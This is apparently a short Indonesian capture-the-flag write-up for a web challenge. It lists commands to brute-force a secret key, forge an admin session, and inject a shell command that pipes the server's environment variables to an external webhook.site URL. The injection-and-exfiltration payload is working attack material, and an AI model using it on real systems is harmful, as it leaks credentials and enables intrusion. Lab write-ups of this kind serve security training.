# Writeup Simple Web

Register akun, ambil timestamp admin dari /users sama cookie sendiri

```
python3 bruthsecretkey.py 
```

```
python3 genuuid.py <uuid> -t <timestamp admint> -r 0 -p 1 > user_ids.txt
```


```
python3 solve.py --userfile user_ids.txt --secret '<secret key>' --username 'admint' --target 'http://localhost:5000/'

```

```
a' ; env | python3 -c 'import sys, urllib.request as r; data=sys.stdin.buffer.read(); req=r.Request("https://webhook.site/2e9a2027-8f76-436c-8dac-b2dcf754e5af", data=data, headers={"Content-Type":"text/plain"}); r.urlopen(req)'

```
